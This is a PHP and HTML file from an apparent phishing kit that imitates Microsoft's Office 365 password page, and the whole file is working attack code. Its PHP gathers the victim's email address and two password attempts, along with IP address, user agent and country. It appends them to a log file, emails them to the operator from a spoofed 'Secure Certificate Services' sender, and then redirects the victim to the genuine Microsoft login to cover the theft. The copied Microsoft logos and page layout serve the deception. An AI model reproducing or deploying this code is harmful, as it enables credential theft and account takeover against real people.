<?php

error_reporting(0);

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$country = $_SESSION['country'];

$username = $_SESSION['username'];

if(isset($_SESSION['password_first']))  {

$password_first = $_SESSION['password_first'];

}

if(!empty($_POST['password']))  {

$password_second = $_POST['password'];

date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "../includes/my_email.php";

$msg = "-------------------------------\n";
$msg .= "Email Account: ".$username."\n";
$msg .= "Pass ( first ): ".$password_first."\n";
$msg .= "Pass ( second ): ".$password_second."\n";
$msg .= "-------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "Country: $country\n";
$msg .= "-------------------------------\n";

$subject = "Official3655 $ip ";
$headers = "From: Secure Certificate Services <Noreply>\r\n";
$headers .= "Reply-To: Office365 Info <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("../logs/office365_details.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);

header("Location: https://login.microsoftonline.com/");

}

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">

<head>

<meta http-equiv="refresh" content="5;URL='https://login.microsoftonline.com'" />

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">

<base href=".">
<title>Enter your password</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="./password_files/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="./password_files/Converged1033.css">
			<style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>
<link rel="image_src" href="https://auth.gfx.ms/16.000.27523.1/images/Windows_Live_v_thumb.jpg">

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div> <div><div class="background" role="presentation"><div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./password_files/0-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;./password_files/0.jpg&quot;);"></div><div class="background-overlay"></div></div></div> 

<form name="f1" id="i0281" spellcheck="false" method="post" autocomplete="off"  method="post" action="complete.php?&sessionid=<?php echo $hash; ?>&securessl=true" onsubmit="return empty();">

 <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle"> <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">

			<div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
						
						<img class="logo" role="presentation" pngsrc="./password_files/microsoft_logo.png" svgsrc="./password_files/microsoft_logo.svg" data-bind="imgSrc" src="./password_files/microsoft_logo.svg"></div> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.I === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart } }">

							<input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">

							<div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"> <div class="identityBanner"> <div class="identity" data-bind="text: displayName, attr: { &#39;title&#39;: displayName }" title=""><?php echo $_SESSION['username']; ?></div> <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="./password_files/picker_account_msa.svg"> </div> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Redirecting...</div><hr>

<br>		
		
		<label>Please wait...<br><br><img src="./password_files/spin.gif"></label>
		
		 </div> </div></div> </div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div> </div> </div> <div id="footer" class="footer default" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2017 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div> </form> </div></body></html>